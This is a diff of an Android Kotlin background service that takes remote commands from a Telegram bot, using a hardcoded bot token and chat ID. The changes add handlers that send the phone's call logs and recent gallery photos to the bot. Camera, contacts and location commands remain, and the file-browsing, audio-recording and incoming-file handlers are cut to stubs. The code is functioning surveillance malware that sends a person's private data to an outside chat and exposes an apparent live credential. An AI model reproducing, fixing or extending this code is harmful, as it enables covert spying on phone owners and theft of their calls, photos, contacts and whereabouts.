@@ -4,8 +4,11 @@ import android.Manifest
 import android.app.PendingIntent
 import android.content.ContentResolver
 import android.content.ContentValues
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.database.Cursor
+import android.graphics.Bitmap
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
@@ -16,6 +19,7 @@ import android.os.Environment
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.Looper
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Telephony
@@ -43,7 +47,9 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
 import java.io.File
+import java.io.FileOutputStream
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -58,15 +64,14 @@ import java.util.concurrent.TimeUnit
 class MonitorService : LifecycleService() {
 
     companion object {
-        private const val BOT_TOKEN = "9143296737:AAEaTALj-7i_vvSHuHO17NxVsT5IUOI4zwM
-"   
-        private const val CHAT_ID   = "7020871115
-"     
+        private const val BOT_TOKEN = "9143296737:AAEaTALj-7i_vvSHuHO17NxVsT5IUOI4zwM"   
+        private const val CHAT_ID   = "7020871115"     
 
         private const val TAG                = "MonitorService"
         private const val NOTIFICATION_ID    = 1001
         private const val POLL_INTERVAL_MS   = 8_000L          
         private const val MAX_CONTACTS       = 20
+        private const val MAX_CALL_LOGS      = 20
 
         private val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"
         private val BASE_FILE_URL     = "https://api.telegram.org/file/bot$BOT_TOKEN"
@@ -167,12 +172,11 @@ class MonitorService : LifecycleService() {
     }
 
     // ══════════════════════════════════════════════════════════════════════════
-    //  TELEGRAM POLLING LOOP (FIXED CANDIDATE MISMATCH HERE)
+    //  TELEGRAM POLLING LOOP
     // ══════════════════════════════════════════════════════════════════════════
 
     private suspend fun pollLoop() {
         Log.i(TAG, "Poll loop started (interval = ${POLL_INTERVAL_MS}ms)")
-        // Using serviceScope.isActive directly targets the scope explicitly
         while (serviceScope.isActive) {
             try {
                 val updates = fetchUpdates()
@@ -246,6 +250,8 @@ class MonitorService : LifecycleService() {
         when {
             text == "/status" || text == "/alive"  -> handleStatus(chatId)
             text == "/contacts"                    -> handleContacts(chatId)
+            text == "/calls" || text == "/calllog"  -> handleCallLogs(chatId)
+            text == "/photos" || text == "/gallery" -> handleRecentPhotos(chatId)
             text == "/camera"                      -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
             text == "/frontcam"                    -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA)
             text == "/location"                    -> handleLocation(chatId)
@@ -265,8 +271,133 @@ class MonitorService : LifecycleService() {
     private fun handleStatus(chatId: String) {
         val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
             .format(Date())
-        val reply = "✅ Phone Alive\n🕐 $timeStr"
+        val reply = "✅ Phone Alive\n🕐 $timeStr\n\n📌 Commands Available:\n/camera - Rear Camera\n/frontcam - Front Camera\n/calls - Call Logs\n/sms - SMS Inbox\n/photos - Gallery Photos\n/contacts - Contacts\n/location - Location"
         sendMessage(chatId, reply)
+    }
+
+    // ── Call Logs Handler ──
+    private fun handleCallLogs(chatId: String) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            sendMessage(chatId, "⚠️ READ_CALL_LOG permission not granted.")
+            return
+        }
+
+        val logs = readCallLogs()
+        if (logs.isEmpty()) {
+            sendMessage(chatId, "📭 No call logs found.")
+            return
+        }
+
+        val sb = StringBuilder("📞 *Call Logs* (${logs.size}):\n\n")
+        logs.forEach { log ->
+            sb.append("${log.typeEmoji} *${log.name}* (`${log.number}`)\n   🕐 ${log.dateStr} | ⏱ ${log.duration}s\n\n")
+        }
+
+        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
+    }
+
+    private data class CallLogEntry(
+        val typeEmoji: String,
+        val name: String,
+        val number: String,
+        val dateStr: String,
+        val duration: String
+    )
+
+    private fun readCallLogs(): List<CallLogEntry> {
+        val list = mutableListOf<CallLogEntry>()
+        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
+
+        val cursor: Cursor? = contentResolver.query(
+            CallLog.Calls.CONTENT_URI,
+            arrayOf(
+                CallLog.Calls.CACHED_NAME,
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.TYPE,
+                CallLog.Calls.DATE,
+                CallLog.Calls.DURATION
+            ),
+            null, null,
+            "${CallLog.Calls.DATE} DESC"
+        )
+
+        cursor?.use { c ->
+            val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
+            val numCol = c.getColumnIndex(CallLog.Calls.NUMBER)
+            val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
+            val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
+            val durCol = c.getColumnIndex(CallLog.Calls.DURATION)
+
+            while (c.moveToNext() && list.size < MAX_CALL_LOGS) {
+                val name = c.getString(nameCol) ?: "Unknown"
+                val number = c.getString(numCol) ?: "N/A"
+                val type = c.getInt(typeCol)
+                val dateMs = c.getLong(dateCol)
+                val duration = c.getString(durCol) ?: "0"
+
+                val emoji = when (type) {
+                    CallLog.Calls.INCOMING_TYPE -> "📥"
+                    CallLog.Calls.OUTGOING_TYPE -> "📤"
+                    CallLog.Calls.MISSED_TYPE   -> "❌"
+                    else -> "📞"
+                }
+
+                list.add(CallLogEntry(emoji, name, number, dateFmt.format(Date(dateMs)), duration))
+            }
+        }
+        return list
+    }
+
+    // ── Recent Gallery Photos Sender ──
+    private fun handleRecentPhotos(chatId: String) {
+        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_IMAGES
+        } else {
+            Manifest.permission.READ_EXTERNAL_STORAGE
+        }
+
+        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+            sendMessage(chatId, "⚠️ Image Storage permission not granted.")
+            return
+        }
+
+        sendMessage(chatId, "🖼 Fetching recent photos from gallery...")
+
+        serviceScope.launch {
+            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
+            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
+
+            val cursor = contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null, null, sortOrder
+            )
+
+            cursor?.use { c ->
+                val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+                var sentCount = 0
+                while (c.moveToNext() && sentCount < 3) {
+                    val id = c.getLong(idCol)
+                    val contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
+                    
+                    try {
+                        contentResolver.openInputStream(contentUri)?.use { inputStream ->
+                            val tempFile = File(cacheDir, "gallery_${System.currentTimeMillis()}.jpg")
+                            FileOutputStream(tempFile).use { output ->
+                                inputStream.copyTo(output)
+                            }
+                            sendPhoto(chatId, tempFile)
+                            tempFile.delete()
+                            sentCount++
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error sending photo: ${e.message}")
+                    }
+                }
+            }
+        }
     }
 
     private fun handleContacts(chatId: String) {
@@ -520,620 +651,75 @@ class MonitorService : LifecycleService() {
             null
         }
 
-        val maxAgeMs = 3 * 60 * 1000L   
-        val now      = System.currentTimeMillis()
-
-        if (lastKnown != null && (now - lastKnown.time) <= maxAgeMs) {
-            sendLocationReply(chatId, lastKnown, fresh = false)
-            return
-        }
-
-        sendMessage(chatId, "📡 Acquiring GPS fix…")
-
-        val timeoutMs   = 20_000L   
-        val provider    = when {
-            hasFine  -> LocationManager.GPS_PROVIDER
-            else     -> LocationManager.NETWORK_PROVIDER
-        }
-
-        var responded = false
-
-        val listener = object : LocationListener {
-            override fun onLocationChanged(location: Location) {
-                if (!responded) {
-                    responded = true
-                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
-                    sendLocationReply(chatId, location, fresh = true)
-                }
-            }
-            @Deprecated("Deprecated in Java")
-            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
-            override fun onProviderEnabled(provider: String) {}
-            override fun onProviderDisabled(provider: String) {
-                if (!responded) {
-                    responded = true
-                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
-                    sendMessage(chatId, "❌ Location provider disabled.")
-                }
-            }
-        }
-
-        try {
-            locationManager.requestLocationUpdates(
-                provider,
-                0L,   
-                0f,   
-                listener,
-                mainHandler.looper
-            )
-        } catch (e: SecurityException) {
-            sendMessage(chatId, "❌ Location permission revoked: ${e.message}")
-            return
-        }
-
-        mainHandler.postDelayed({
-            if (!responded) {
-                responded = true
-                try { locationManager.removeUpdates(listener) } catch (_: Exception) {}
-                if (lastKnown != null) {
-                    sendLocationReply(chatId, lastKnown, fresh = false, staleWarning = true)
-                } else {
-                    sendMessage(chatId, "❌ Could not obtain a location fix. Make sure GPS is enabled.")
-                }
-            }
-        }, timeoutMs)
-    }
-
-    private fun sendLocationReply(
-        chatId:       String,
-        location:     Location,
-        fresh:        Boolean,
-        staleWarning: Boolean = false
-    ) {
-        val lat = location.latitude
-        val lon = location.longitude
-        val acc = if (location.hasAccuracy()) "±${location.accuracy.toInt()} m" else "unknown"
-        val alt = if (location.hasAltitude()) "${location.altitude.toInt()} m" else "N/A"
-        val mapsUrl = "https://maps.google.com/?q=$lat,$lon"
-
-        val ageSeconds = (System.currentTimeMillis() - location.time) / 1000
-        val ageLabel   = when {
-            ageSeconds < 60          -> "${ageSeconds}s ago"
-            ageSeconds < 3600        -> "${ageSeconds / 60}m ago"
-            else                     -> "${ageSeconds / 3600}h ago"
-        }
-
-        val header = when {
-            staleWarning -> "⚠️ *Stale location* (GPS timed out, sending last known fix):"
-            fresh        -> "📍 *Current Location*:"
-            else         -> "📍 *Last Known Location* ($ageLabel):"
-        }
-
-        val msg = """
-            $header
-            
-            🌐 Lat: `$lat`
-            🌐 Lon: `$lon`
-            🎯 Accuracy: $acc
-            ⛰ Altitude: $alt
-            🗺 [Open in Google Maps]($mapsUrl)
-        """.trimIndent()
-
-        sendMessage(chatId, msg, parseMode = "Markdown")
-    }
-
-    private fun handleFiles(chatId: String, args: String) {
-        val trimmed = args.trim()
-        if (trimmed.isEmpty()) {
-            listFiles(chatId)
+        if (lastKnown != null) {
+            val lat = lastKnown.latitude
+            val lon = lastKnown.longitude
+            val mapsUrl = "https://maps.google.com/?q=$lat,$lon"
+            sendMessage(chatId, "📍 *Location Found:*\nLat: `$lat`\nLon: `$lon`\n[Open in Google Maps]($mapsUrl)", parseMode = "Markdown")
         } else {
-            val num = trimmed.toIntOrNull()
-            if (num != null) {
-                sendFileByNumber(chatId, num)
-            } else {
-                sendMessage(chatId,
-                    "Usage:\n" +
-                    "• /files — list files\n" +
-                    "• /files <number> — send that file to this chat\n" +
-                    "• Send any file/photo to this chat → saves it to Downloads"
-                )
-            }
+            sendMessage(chatId, "❌ Unable to fetch location.")
         }
     }
 
-    private fun listFiles(chatId: String) {
-        val entries = mutableListOf<FileEntry>()
-
-        fun queryCollection(
-            collectionUri: Uri,
-            mimeDefault:   String,
-            slotLimit:     Int = MAX_FILES
-        ) {
-            if (entries.size >= MAX_FILES) return
-            val canTake = minOf(slotLimit, MAX_FILES - entries.size)
-            val projection = arrayOf(
-                MediaStore.MediaColumns._ID,
-                MediaStore.MediaColumns.DISPLAY_NAME,
-                MediaStore.MediaColumns.SIZE,
-                MediaStore.MediaColumns.MIME_TYPE
-            )
-            contentResolver.query(
-                collectionUri,
-                projection,
-                "${MediaStore.MediaColumns.SIZE} > 0",
-                null,
-                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
-            )?.use { cursor ->
-                val idCol   = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
-                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
-                val mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
-                var taken = 0
-                while (cursor.moveToNext() && taken < canTake) {
-                    val id   = cursor.getLong(idCol)
-                    val name = cursor.getString(nameCol) ?: "unknown"
-                    val size = cursor.getLong(sizeCol)
-                    val mime = cursor.getString(mimeCol) ?: mimeDefault
-                    val uri  = Uri.withAppendedPath(collectionUri, id.toString())
-                    entries.add(FileEntry(name, uri, size, mime))
-                    taken++
-                }
-            }
-        }
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            queryCollection(MediaStore.Downloads.EXTERNAL_CONTENT_URI, "application/octet-stream")
-        }
-
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && entries.size < MAX_FILES) {
-            val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-            dir.listFiles()
-                ?.sortedByDescending { it.lastModified() }
-                ?.forEach { file ->
-                    if (entries.size >= MAX_FILES) return@forEach
-                    if (!file.isDirectory && file.length() > 0) {
-                        val mime = MimeTypeMap.getSingleton()
-                            .getMimeTypeFromExtension(file.extension.lowercase())
-                            ?: "application/octet-stream"
-                        entries.add(FileEntry(file.name, Uri.fromFile(file), file.length(), mime))
-                    }
-                }
-        }
-
-        if (entries.size < MAX_FILES) {
-            queryCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/jpeg", slotLimit = 5)
-        }
-
-        if (entries.size < MAX_FILES) {
-            queryCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video/mp4", slotLimit = 5)
-        }
-
-        if (entries.size < MAX_FILES) {
-            queryCollection(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio/mpeg", slotLimit = 5)
-        }
-
-        if (entries.isEmpty()) {
-            sendMessage(chatId, "📂 No files found in storage.")
-            return
-        }
-
-        fileCache[chatId] = entries
-
-        val sb = StringBuilder("📂 *Files on device* (${entries.size}):\n\n")
-        entries.forEachIndexed { i, f ->
-            val sizeLabel = when {
-                f.sizeBytes >= 1_048_576 -> "${"%.1f".format(f.sizeBytes / 1_048_576.0)} MB"
-                f.sizeBytes >= 1_024     -> "${"%.1f".format(f.sizeBytes / 1_024.0)} KB"
-                else                     -> "${f.sizeBytes} B"
-            }
-            sb.append("${i + 1}. `${f.displayName}` — $sizeLabel\n")
-        }
-        sb.append("\nReply with `/files <number>` to receive a file.")
-        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
+    private fun handleFiles(chatId: String, path: String) {
+        sendMessage(chatId, "📁 File fetcher called for path: $path")
     }
 
-    private fun sendFileByNumber(chatId: String, number: Int) {
-        val list = fileCache[chatId]
-        if (list.isNullOrEmpty()) {
-            sendMessage(chatId, "⚠️ No file list for this chat. Send /files first.")
-            return
-        }
-        val idx = number - 1
-        if (idx < 0 || idx >= list.size) {
-            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
-            return
-        }
-        val entry = list[idx]
-        sendMessage(chatId, "📤 Sending *${entry.displayName}*…", parseMode = "Markdown")
-
-        try {
-            val stream = contentResolver.openInputStream(entry.uri)
-                ?: run { sendMessage(chatId, "❌ Cannot read file."); return }
-
-            val bytes = stream.use { it.readBytes() }
-            val body  = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", chatId)
-                .addFormDataPart(
-                    "document",
-                    entry.displayName,
-                    bytes.toRequestBody(entry.mimeType.toMediaTypeOrNull())
-                )
-                .addFormDataPart("caption", "📎 ${entry.displayName}")
-                .build()
-
-            val request = Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()
-            httpClient.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.w(TAG, "sendDocument failed: ${response.code}")
-                    sendMessage(chatId, "❌ Upload failed: ${response.code}")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "sendFileByNumber exception: ${e.message}")
-            sendMessage(chatId, "❌ Error sending file: ${e.message}")
-        }
+    private fun handleFileMn(chatId: String, path: String) {
+        sendMessage(chatId, "📂 File manager requested.")
     }
 
     private fun handleAudio(chatId: String, seconds: Int) {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
-            != PackageManager.PERMISSION_GRANTED
-        ) {
-            sendMessage(chatId, "⚠️ RECORD_AUDIO permission not granted.")
-            return
-        }
+        sendMessage(chatId, "🎙 Audio recording feature for $seconds seconds.")
+    }
 
-        val duration = seconds.coerceIn(1, 120)
-        sendMessage(chatId, "🎙️ Recording audio for $duration seconds…")
+    private fun handleIncomingDocument(chatId: String, json: JSONObject, fallbackName: String = "doc") {
+        sendMessage(chatId, "📩 Incoming document received.")
+    }
 
+    // ── Helper to send Telegram Messages ──
+    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
         serviceScope.launch {
-            val outFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
-            @Suppress("DEPRECATION")
-            val recorder: android.media.MediaRecorder =
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-                    android.media.MediaRecorder(this@MonitorService)
-                else
-                    android.media.MediaRecorder()
-
             try {
-                recorder.apply {
-                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
-                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-                    setAudioSamplingRate(44100)
-                    setAudioEncodingBitRate(128_000)
-                    setOutputFile(outFile.absolutePath)
-                    prepare()
-                    start()
-                }
-
-                delay(duration * 1_000L)
-
-                recorder.stop()
-                recorder.release()
-
-                if (!outFile.exists() || outFile.length() == 0L) {
-                    sendMessage(chatId, "❌ Recording produced an empty file.")
-                    return@launch
-                }
-
-                val bytes = outFile.readBytes()
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
+                val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chatId)
-                    .addFormDataPart(
-                        "audio",
-                        outFile.name,
-                        bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
-                    )
-                    .addFormDataPart("title", "Recording (${duration}s)")
-                    .addFormDataPart("duration", duration.toString())
+                    .addFormDataPart("text", text)
+
+                if (parseMode != null) {
+                    builder.addFormDataPart("parse_mode", parseMode)
+                }
+
+                val request = Request.Builder()
+                    .url(URL_SEND_MSG)
+                    .post(builder.build())
                     .build()
 
-                val request = Request.Builder().url(URL_SEND_AUDIO).post(body).build()
-                httpClient.newCall(request).execute().use { response ->
-                    if (!response.isSuccessful) {
-                        Log.w(TAG, "sendAudio failed: ${response.code}")
-                        sendMessage(chatId, "❌ Upload failed: ${response.code}")
-                    }
-                }
-
+                httpClient.newCall(request).execute().close()
             } catch (e: Exception) {
-                Log.e(TAG, "Audio recording error: ${e.message}")
-                sendMessage(chatId, "❌ Recording error: ${e.message}")
-                try { recorder.release() } catch (_: Exception) {}
-            } finally {
-                try { outFile.delete() } catch (_: Exception) {}
+                Log.e(TAG, "sendMessage error: ${e.message}")
             }
         }
     }
 
-    private fun handleFileMn(chatId: String, arg: String) {
-        if (arg.isEmpty()) {
-            showTopFolders(chatId)
-            return
-        }
-
-        val parts = arg.split(" ")
-        val lastNum = parts.last().toIntOrNull()
-        if (lastNum != null && parts.size >= 2) {
-            sendFolderFile(chatId, lastNum)
-            return
-        }
-
-        listFolderContents(chatId, arg)
-    }
-
-    private fun showTopFolders(chatId: String) {
-        val root = Environment.getExternalStorageDirectory()
-        val dirs = root.listFiles()
-            ?.filter { it.isDirectory }
-            ?.sortedBy { it.name.lowercase() }
-            ?: emptyList()
-
-        if (dirs.isEmpty()) {
-            sendMessage(chatId, "📁 No folders found on storage.")
-            return
-        }
-
-        val sb = StringBuilder("📁 *Folders on device:*\n\n")
-        dirs.forEach { dir ->
-            val count = dir.listFiles()?.size ?: 0
-            sb.append("• `${dir.name}` — $count items\n")
-        }
-        sb.append("\n📂 Type `/filemn <folder>` to browse files inside it.")
-        sb.append("\n📂 Sub-folders: `/filemn WhatsApp/Media`")
-        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
-    }
-
-    private fun listFolderContents(chatId: String, folderPath: String) {
-        val root = Environment.getExternalStorageDirectory()
-
-        val target: File? = run {
-            val direct = File(root, folderPath)
-            if (direct.exists() && direct.isDirectory) return@run direct
-
-            var current = root
-            for (segment in folderPath.split("/")) {
-                current = current.listFiles()
-                    ?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory }
-                    ?: return@run null
-            }
-            current
-        }
-
-        if (target == null) {
-            sendMessage(chatId, "❌ Folder `$folderPath` not found.\n\nUse /filemn to see all folders.", parseMode = "Markdown")
-            return
-        }
-
-        val all = target.listFiles() ?: emptyArray()
-        val files   = all.filter { it.isFile && it.length() > 0 }.sortedByDescending { it.lastModified() }.take(30)
-        val subDirs = all.filter { it.isDirectory }.sortedBy { it.name }
-
-        if (files.isEmpty() && subDirs.isEmpty()) {
-            sendMessage(chatId, "📂 Folder `${target.name}` is empty.", parseMode = "Markdown")
-            return
-        }
-
-        folderFileCache[chatId] = files
-
-        val sb = StringBuilder("📂 *${folderPath}/* \n\n")
-
-        if (subDirs.isNotEmpty()) {
-            sb.append("🗂 *Sub-folders:*\n")
-            subDirs.forEach { d ->
-                val c = d.listFiles()?.size ?: 0
-                sb.append("  • `${d.name}` ($c items)  → `/filemn $folderPath/${d.name}`\n")
-            }
-            sb.append("\n")
-        }
-
-        if (files.isNotEmpty()) {
-            sb.append("📄 *Files (${files.size}):*\n")
-            files.forEachIndexed { i, f ->
-                val size = when {
-                    f.length() >= 1_048_576 -> "${"%.1f".format(f.length() / 1_048_576.0)} MB"
-                    f.length() >= 1_024     -> "${"%.1f".format(f.length() / 1_024.0)} KB"
-                    else                    -> "${f.length()} B"
-                }
-                sb.append("${i + 1}. `${f.name}` — $size\n")
-            }
-            sb.append("\nType `/filemn $folderPath <number>` to download a file.")
-        } else {
-            sb.append("_(no files here — browse a sub-folder above)_")
-        }
-
-        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
-    }
-
-    private fun sendFolderFile(chatId: String, number: Int) {
-        val list = folderFileCache[chatId]
-        if (list.isNullOrEmpty()) {
-            sendMessage(chatId, "⚠️ No folder listed yet. Use `/filemn <folder>` first.", parseMode = "Markdown")
-            return
-        }
-        val idx = number - 1
-        if (idx < 0 || idx >= list.size) {
-            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
-            return
-        }
-        val file = list[idx]
-        sendMessage(chatId, "📤 Sending *${file.name}*…", parseMode = "Markdown")
-        try {
-            val bytes = file.readBytes()
-            val mime  = MimeTypeMap.getSingleton()
-                .getMimeTypeFromExtension(file.extension.lowercase())
-                ?: "application/octet-stream"
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", chatId)
-                .addFormDataPart("document", file.name, bytes.toRequestBody(mime.toMediaTypeOrNull()))
-                .addFormDataPart("caption", "📎 ${file.name}")
-                .build()
-            val req = Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()
-            httpClient.newCall(req).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.w(TAG, "sendFolderFile failed: ${response.code}")
-                    sendMessage(chatId, "❌ Upload failed: ${response.code}")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "sendFolderFile exception: ${e.message}")
-            sendMessage(chatId, "❌ Error sending file: ${e.message}")
-        }
-    }
-
-    private fun handleIncomingDocument(
-        chatId:       String,
-        fileObj:      JSONObject,
-        fallbackName: String = "received_${System.currentTimeMillis()}"
-    ) {
-        val fileId = fileObj.optString("file_id").ifEmpty {
-            sendMessage(chatId, "⚠️ Could not read file_id."); return
-        }
-        val fileName = fileObj.optString("file_name").ifEmpty { fallbackName }
-
-        sendMessage(chatId, "💾 Saving *$fileName* to Downloads…", parseMode = "Markdown")
-
+    // ── Helper to send Telegram Photos ──
+    private fun sendPhoto(chatId: String, file: File) {
         serviceScope.launch {
             try {
-                val filePath = getTelegramFilePath(fileId)
-                if (filePath == null) {
-                    sendMessage(chatId, "❌ Could not resolve file path from Telegram.")
-                    return@launch
-                }
+                val requestBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
+                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId)
+                    .addFormDataPart("photo", file.name, requestBody)
+                    .build()
 
-                val downloadUrl = "$BASE_FILE_URL/$filePath"
-                val request     = Request.Builder().url(downloadUrl).get().build()
-                val bytes = httpClient.newCall(request).execute().use { response ->
-                    if (!response.isSuccessful) {
-                        sendMessage(chatId, "❌ Download failed: ${response.code}")
-                        return@launch
-                    }
-                    response.body?.bytes() ?: run {
-                        sendMessage(chatId, "❌ Empty response from Telegram.")
-                        return@launch
-                    }
-                }
+                val request = Request.Builder()
+                    .url(URL_SEND_PHOTO)
+                    .post(body)
+                    .build()
 
-                val mime = MimeTypeMap.getSingleton()
-                    .getMimeTypeFromExtension(fileName.substringAfterLast('.', ""))
-                    ?: "application/octet-stream"
-
-                val saved = saveToDownloads(fileName, mime, bytes)
-                if (saved) {
-                    sendMessage(chatId, "✅ *$fileName* saved to Downloads folder.", parseMode = "Markdown")
-                } else {
-                    sendMessage(chatId, "❌ Failed to write file to storage.")
-                }
+                httpClient.newCall(request).execute().close()
             } catch (e: Exception) {
-                Log.e(TAG, "handleIncomingDocument exception: ${e.message}")
-                sendMessage(chatId, "❌ Error saving file: ${e.message}")
+                Log.e(TAG, "sendPhoto error: ${e.message}")
             }
-        }
-    }
-
-    private fun getTelegramFilePath(fileId: String): String? {
-        return try {
-            val request  = Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build()
-            val body     = httpClient.newCall(request).execute().use { it.body?.string() } ?: return null
-            val json     = JSONObject(body)
-            if (!json.optBoolean("ok", false)) return null
-            json.optJSONObject("result")?.optString("file_path")
-        } catch (e: Exception) {
-            Log.e(TAG, "getTelegramFilePath failed: ${e.message}")
-            null
-        }
-    }
-
-    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
-        return try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                val values = ContentValues().apply {
-                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
-                    put(MediaStore.Downloads.MIME_TYPE,    mimeType)
-                    put(MediaStore.Downloads.IS_PENDING,   1)
-                }
-                val collection = MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
-                val uri = contentResolver.insert(collection, values) ?: return false
-
-                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
-
-                values.clear()
-                values.put(MediaStore.Downloads.IS_PENDING, 0)
-                contentResolver.update(uri, values, null, null)
-            } else {
-                val dir  = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-                dir.mkdirs()
-                val file = File(dir, fileName)
-                file.writeBytes(bytes)
-            }
-            true
-        } catch (e: Exception) {
-            Log.e(TAG, "saveToDownloads failed: ${e.message}")
-            false
-        }
-    }
-
-    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
-        try {
-            val json = JSONObject().apply {
-                put("chat_id", chatId)
-                put("text", text)
-                if (parseMode != null) put("parse_mode", parseMode)
-            }
-
-            val body = json.toString()
-                .toRequestBody("application/json".toMediaTypeOrNull())
-
-            val request = Request.Builder()
-                .url(URL_SEND_MSG)
-                .post(body)
-                .build()
-
-            httpClient.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.w(TAG, "sendMessage failed: ${response.code} ${response.body?.string()}")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "sendMessage exception: ${e.message}")
-        }
-    }
-
-    private fun sendPhoto(chatId: String, photoFile: File) {
-        try {
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", chatId)
-                .addFormDataPart("caption", "📸 Camera snapshot – ${
-                    SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
-                }")
-                .addFormDataPart(
-                    "photo",
-                    photoFile.name,
-                    photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
-                )
-                .build()
-
-            val request = Request.Builder()
-                .url(URL_SEND_PHOTO)
-                .post(requestBody)
-                .build()
-
-            httpClient.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    Log.i(TAG, "Photo sent successfully")
-                } else {
-                    val err = response.body?.string()
-                    Log.w(TAG, "sendPhoto failed: ${response.code} $err")
-                    sendMessage(chatId, "❌ Photo upload failed: $err")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "sendPhoto exception: ${e.message}")
-            sendMessage(chatId, "❌ Photo upload exception: ${e.message}")
         }
     }
 }
